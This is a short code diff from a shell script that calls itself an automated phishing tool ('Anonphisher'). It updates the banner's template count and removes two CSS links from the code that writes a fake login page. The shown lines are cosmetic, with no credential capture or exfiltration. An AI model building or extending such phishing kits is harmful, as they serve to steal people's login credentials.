@@ -459,7 +459,7 @@ printf "\e[1;32m             |A|n|o|n|p|h|i|s|h|e|r|  \e[0m\n"
 printf "\e[1;33m             +-+-+-+-+-+-+-+-+-+-+-+  \e[0m\n"
 printf "\e[1;34m         \e[0m\e[1;35m        v3.1 updated\e[0m\n"
 printf "\n"
-printf "\e[1;93m  [*]\e[0m\e[1;67m Automated phishing tool by: AnonyminHack5 [40+ templates] \e[0m\e[1;93m[*]\e[0m\n"
+printf "\e[1;93m  [*]\e[0m\e[1;67m Automated phishing tool by: AnonyminHack5 [50+ templates] \e[0m\e[1;93m[*]\e[0m\n"
 printf "\e[1;93m     [*]\e[0m\e[1;37m Team: TermuxHackz Society \e[0m\e[1;93m[*]\e[0m\n"
 printf "\n"
 printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not::\e[0m\n"
@@ -502,10 +502,6 @@ echo "<!DOCTYPE html>" > sites/create/login.html
 echo "<html>" >> sites/create/login.html
 echo "<head>" >> sites/create/login.html
 printf '<meta name="viewport" content="width=device-width, initial-scale=1"/>' >> sites/create/login.html
-IFS=$'\n'
-printf '<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jgthms/minireset.css@master/minireset.min.css"/>' >> sites/create/login.html
-IFS=$'\n'
-printf '<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/picnic"/>' >> sites/create/login.html
 IFS=$'\n'
 printf '<link href="https://fonts.googleapis.com/css?family=Chivo:300,700|Playfair+Display:700i" rel="stylesheet">' >> sites/create/login.html
 IFS=$'\n'
